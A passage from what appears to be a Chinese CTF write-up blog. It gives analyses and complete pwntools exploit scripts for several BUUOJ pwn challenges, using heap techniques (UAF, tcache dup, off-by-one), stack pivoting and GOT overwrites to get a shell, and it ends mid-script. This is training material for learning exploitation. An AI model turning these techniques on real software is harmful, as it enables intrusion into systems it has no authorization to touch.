alt></p><p>如图所示，相差10。然后利用原来的溢出点，放入printf的got表地址，让其减10次1，也就是答对10次serect后，让程序走向结束处，调用printf。其printf的buf打印的是name，这个是可控的，写成<code>/bin/sh\x00</code>即可。</p><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./secret'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29635</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()payload = <span class="hljs-string">'/bin/sh\x00'</span> + <span class="hljs-string">"\x00"</span> * <span class="hljs-number">8</span> + p64(elf.got[<span class="hljs-string">'printf'</span>])[:<span class="hljs-number">5</span>]<span class="hljs-comment">#此处payload 因为read那里读的数据大小限制，需要调整一下payload的长度。</span><span class="hljs-comment"># debug()</span>sla(<span class="hljs-string">"What's your name?"</span>,payload)answer = [<span class="hljs-number">0x476B</span>,<span class="hljs-number">0x2D38</span>,<span class="hljs-number">0x4540</span>,<span class="hljs-number">0x3E77</span>,<span class="hljs-number">0x3162</span>,<span class="hljs-number">0x3F7D</span>,<span class="hljs-number">0x357A</span>,<span class="hljs-number">0x3CF5</span>,<span class="hljs-number">0x2F9E</span>,<span class="hljs-number">0x41EA</span>,<span class="hljs-number">0x48D8</span>,<span class="hljs-number">0x2763</span>,<span class="hljs-number">0x474C</span>,<span class="hljs-number">0x3809</span>,<span class="hljs-number">0x2E63</span>]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(answer)):    print(answer[i])    sa(<span class="hljs-string">"Secret"</span>,str(answer[i]))sla(<span class="hljs-string">"Secret"</span>,<span class="hljs-string">'1'</span>)itr()</code></pre></div><h2 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a><code>ciscn_2019_es_1</code></h2><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>64位，ubuntu 18.  存在 UAF，十分简单的tcache dup攻击。</p><h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_2019_es_1'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29639</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,name,call)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'name'</span>,str(name))    sa(<span class="hljs-string">'call'</span>,str(call))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">call</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))add(<span class="hljs-number">0x500</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'chumen77'</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'chumen77'</span>) <span class="hljs-comment">#1</span><span class="hljs-comment"># debug()</span>call(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'name:\n'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)<span class="hljs-comment">#get libc</span>add(<span class="hljs-number">0x510</span><span class="hljs-number">-0x20</span><span class="hljs-number">-0x10</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'chumen77'</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'chumen77'</span>) <span class="hljs-comment">#3</span>call(<span class="hljs-number">3</span>)call(<span class="hljs-number">3</span>)free_hook = libc_base + <span class="hljs-number">0x3ed8e8</span>add(<span class="hljs-number">0x20</span>,p64(free_hook),p64(free_hook)) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x20</span>,p64(free_hook),p64(free_hook)) <span class="hljs-comment">#5</span>rec = rce18[<span class="hljs-number">1</span>] + libc_baseadd(<span class="hljs-number">0x20</span>,p64(rec),p64(rec))call(<span class="hljs-number">1</span>)itr()</code></pre></div><h2 id="ciscn-2019-s-4"><a href="#ciscn-2019-s-4" class="headerlink" title="ciscn_2019_s_4"></a><code>ciscn_2019_s_4</code></h2><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vul</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+0h] [ebp-28h]</span>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>u);  read(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x30</span>u);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hello, %s\n"</span>, &amp;s);  read(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x30</span>u);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hello, %s\n"</span>, &amp;s);&#125;</code></pre></div><ul><li>存在栈溢出，溢出8个字节，考虑栈转移。</li><li>在填充buf， <code>%s</code> 在32位用于泄漏栈上的信息。</li></ul><p>所以可以考虑泄漏处栈地址，libc地址。从而算出buf的base与libc base。</p><p>首先可以明确一点可以覆盖返回地址，第一下考虑直接覆盖为<code>one_gadget</code> 本地通远程不通。</p><p>然后就考虑用栈转移到buf上来获取shell。</p><h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_s_4'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26932</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()payload = <span class="hljs-string">'a'</span> * (<span class="hljs-number">0x28</span> - <span class="hljs-number">1</span> ) + <span class="hljs-string">'b'</span>sa(<span class="hljs-string">'name'</span>,payload)ru(<span class="hljs-string">"b"</span>)buf_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x38</span>r(<span class="hljs-number">4</span>)libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1fb9b0</span>info_addr(<span class="hljs-string">'stack'</span>,buf_base)info_addr(<span class="hljs-string">'libc'</span>,libc_base)payload = p32(<span class="hljs-number">0x8048450</span>) + p32(elf.plt[<span class="hljs-string">'system'</span>]) + p32(<span class="hljs-number">0x8048450</span>) + p32(buf_base+<span class="hljs-number">16</span>) + <span class="hljs-string">'/bin/sh\x00'</span>payload = payload.ljust((<span class="hljs-number">0x30</span><span class="hljs-number">-4</span><span class="hljs-number">-4</span><span class="hljs-number">-8</span>),<span class="hljs-string">'b'</span>) + p32(buf_base) *<span class="hljs-number">3</span>+ p32(<span class="hljs-number">0x80485FD</span>)s(payload)itr()</code></pre></div><h2 id="ciscn-2019-final-2"><a href="#ciscn-2019-final-2" class="headerlink" title="ciscn_2019_final_2"></a><code>ciscn_2019_final_2</code></h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>程序很简单，但是也很细节，由于自己的逆向能力有点差，没有注意部分细节，造成构造堆块，进行leak和改写时，造成较大的困难和迷惑。</p><p>开启了沙盒不能get shell：</p><div class="hljs"><pre><code class="hljs undefined">#  line  CODE  JT   JF      K# =================================#  <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch#  <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) goto <span class="hljs-number">0007</span>#  <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number#  <span class="hljs-number">0003</span>: <span class="hljs-number">0x35</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-keyword">if</span> (A &lt; <span class="hljs-number">0x40000000</span>) goto <span class="hljs-number">0005</span>#  <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0xffffffff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0xffffffff</span>) goto <span class="hljs-number">0007</span>#  <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A == execve) goto <span class="hljs-number">0007</span>#  <span class="hljs-number">0006</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW#  <span class="hljs-number">0007</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL</code></pre></div><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><ul><li>UAF</li></ul><p>比如：</p><h4 id="程序处："><a href="#程序处：" class="headerlink" title="程序处："></a>程序处：</h4><h5 id="add函数："><a href="#add函数：" class="headerlink" title="add函数："></a>add函数：</h5><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> *v0; <span class="hljs-comment">// rbx</span>__int16 v1; <span class="hljs-comment">// ax</span></code></pre></div><div class="hljs"><pre><code class="hljs c">v0 = (<span class="hljs-keyword">int</span> *)int_pt;*v0 = get_atoi();*((_DWORD *)int_pt + <span class="hljs-number">2</span>) = *(_DWORD *)int_pt;</code></pre></div><div class="hljs"><pre><code class="hljs c">v1 = get_atoi();*(_WORD *)short_pt = v1;*((_WORD *)short_pt + <span class="hljs-number">4</span>) = *(_WORD *)short_pt;</code></pre></div><p>开始对数据类型的大小没有注意，这几处决定着</p><ul><li>int型堆块时，只能写上4字节的数据</li><li>short int 型堆块时，只能写上2字节的数据</li></ul><h5 id="show函数："><a href="#show函数：" class="headerlink" title="show函数："></a>show函数：</h5><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">1</span> &amp;&amp; int_pt )    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"your int type inode number :%d\n"</span>, *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)int_pt);  <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">2</span> &amp;&amp; short_pt )    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"your short type inode number :%d\n"</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)*(<span class="hljs-keyword">signed</span> __int16 *)short_pt);</code></pre></div><p>意味着leak时也是只能泄漏出部分的字节，增加在利用时的难度，需要利用合适的堆块进行攻击，其合适是指上面有残留合适的数据，然后改末尾几个字节。</p><h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><p>scanf函数是从stdin中读取数据，且在<code>__IO_2_stdio_</code> 的io结构体存在一个<code>_fileno</code>的标识位，默认值是0，若将其改成其他的文件号，调用scanf函数在获取时，就会获取对应文件。</p><h4 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h4><ul><li>程序只让你分配0x30或者0x20的堆块，如何伪造出一个至少0x90的堆块，如何释放后，来泄漏libc。</li><li>泄漏出来的数据不是完整的，可写时只能写上2、4字节</li></ul><h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_final_2'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25252</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(type,number)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'&gt;'</span>,str(type))    sla(<span class="hljs-string">":"</span>,str(number))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(type)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'&gt;'</span>,str(type))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(type)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'&gt;'</span>,str(type))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leave</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'4'</span>)    <span class="hljs-comment"># sa('?',str(mes))</span>add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)free(<span class="hljs-number">1</span>) <span class="hljs-comment">#leave chunk 0 </span>add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>) <span class="hljs-comment"># 0x90</span><span class="hljs-comment">#ready to dup</span>add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-comment"># get chunk0</span>free(<span class="hljs-number">2</span>)<span class="hljs-comment">#leak heap</span>show(<span class="hljs-number">2</span>)ru(<span class="hljs-string">'number :'</span>)chunk0_addr_word = int(ru(<span class="hljs-string">'\n'</span>)) - <span class="hljs-number">0xa0</span>info_addr(<span class="hljs-string">'chunk0_addr'</span>,chunk0_addr_word)add(<span class="hljs-number">2</span>,chunk0_addr_word)add(<span class="hljs-number">2</span>,chunk0_addr_word)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x91</span>) <span class="hljs-comment">#fake unsortbin chunk</span><span class="hljs-comment">#full tache bins</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(<span class="hljs-number">1</span>)    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<span class="hljs-comment">#leak libc</span>free(<span class="hljs-number">1</span>)show(<span class="hljs-number">1</span>)ru(<span class="hljs-string">'number :'</span>)stdin_fillno = int(ru(<span class="hljs-string">'\n'</span>)) - <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x70</span>info_addr(<span class="hljs-string">'stdin_fillno'</span>,stdin_fillno)<span class="hljs-comment">#ready to attack stdin_fillno ,use taeche dup</span>add(<span class="hljs-number">1</span>,stdin_fillno)add(<span class="hljs-number">1</span>,stdin_fillno)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">2</span>,stdin_fillno)free(<span class="hljs-number">1</span>)<span class="hljs-comment">#leak contains libc's heap</span>show(<span class="hljs-number">1</span>)ru(<span class="hljs-string">'number :'</span>)chunk1_addr_dword = int(ru(<span class="hljs-string">'\n'</span>)) - <span class="hljs-number">0x30</span>info_addr(<span class="hljs-string">'chunk1_addr_dword'</span>,chunk1_addr_dword)<span class="hljs-comment">#change the 0x30bins chains</span>add(<span class="hljs-number">1</span>,chunk1_addr_dword)add(<span class="hljs-number">1</span>,chunk1_addr_dword)add(<span class="hljs-number">1</span>,stdin_fillno)<span class="hljs-comment">#attck the fileno</span>add(<span class="hljs-number">1</span>,<span class="hljs-number">666</span>)leave()itr()</code></pre></div><p>渣渣英文注释，先不改了。感觉还是挺不容易做的题，堆块如何构造想了老久。到别的师傅那里，归类为简单题。太菜了太菜了，基础还不是很好。</p><h2 id="pwnable-hacknote"><a href="#pwnable-hacknote" class="headerlink" title="pwnable_hacknote"></a><code>pwnable_hacknote</code></h2><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>简单的uaf</p><h4 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h4><div class="hljs"><pre><code class="hljs c">(*(<span class="hljs-keyword">void</span> (__cdecl **)(<span class="hljs-keyword">void</span> *))ptr[v1])(ptr[v1]);</code></pre></div><p>此处在改完<code>ptr[v1]</code>为system以后，其参数的指针是从这个堆块开始的要提前进行截断。</p><div class="hljs"><pre><code class="hljs c">system(p32(system) + '||sh')system(p32(system) + ';sh;')</code></pre></div><h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./hacknote'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27225</span>)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'Content'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'bbbb'</span>)add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'bbbb'</span>)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">8</span>,p32(<span class="hljs-number">0x0804862B</span>) + p32(elf.got[<span class="hljs-string">'__libc_start_main'</span>]))show(<span class="hljs-number">0</span>)r()libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x18540</span>info_addr(<span class="hljs-string">'base'</span>,libc_base)free(<span class="hljs-number">2</span>)system = <span class="hljs-number">0x0003ada0</span> + libc_baseadd(<span class="hljs-number">8</span>,p32(system) + <span class="hljs-string">'||sh'</span>)show(<span class="hljs-number">0</span>)itr()</code></pre></div><p>Buu远程打不通。。</p><h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a><code>hitcontraining_heapcreator</code></h2><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>Edit函数处，故意可以多写出一个字节。</p><ul><li>off by one</li></ul><h3 id="exp-16"><a href="#exp-16" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./heapcreator'</span>context.log_level = <span class="hljs-string">'debug'</span>elf = ELF(local_file)debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26646</span>)    libc = elf.libc    <span class="hljs-comment"># remote_libc = '.' # './libc.so.6'</span>    <span class="hljs-comment"># libc = ELF(remote_libc)</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> 